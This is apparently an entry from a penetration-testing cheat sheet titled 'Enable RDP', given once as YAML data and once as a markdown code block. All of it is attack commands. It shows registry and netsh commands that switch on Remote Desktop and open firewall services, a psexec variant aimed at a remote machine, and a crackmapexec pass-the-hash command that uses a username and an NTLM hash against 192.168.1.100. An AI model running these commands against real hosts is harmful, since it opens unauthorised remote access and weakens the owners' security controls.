---
id: c136c221-68c1-4879-bc88-61f149c35d9d
name: Enable RDP
type: command
executor: bash
data: 'PS C:\> reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v
  fDenyTSConnections /t REG_DWORD /d 0x00000000 /f

  PS C:\> netsh firewall set service remoteadmin enable

  PS C:\> netsh firewall set service remotedesktop enable

  # Alternative

  C:\> psexec \\machinename reg add "hklm\system\currentcontrolset\control\terminal
  server" /f /v fDenyTSConnections /t REG_DWORD /d 0

  root@payload$ crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f
  -M rdp -o ACTION=enable'
output: null
created_at: '2023-04-06T03:56:31.036684+00:00'
updated_at: '2023-04-10T20:37:56.779209+00:00'
---

# Enable RDP

```bash
PS C:\> reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x00000000 /f
PS C:\> netsh firewall set service remoteadmin enable
PS C:\> netsh firewall set service remotedesktop enable
# Alternative
C:\> psexec \\machinename reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
root@payload$ crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
```


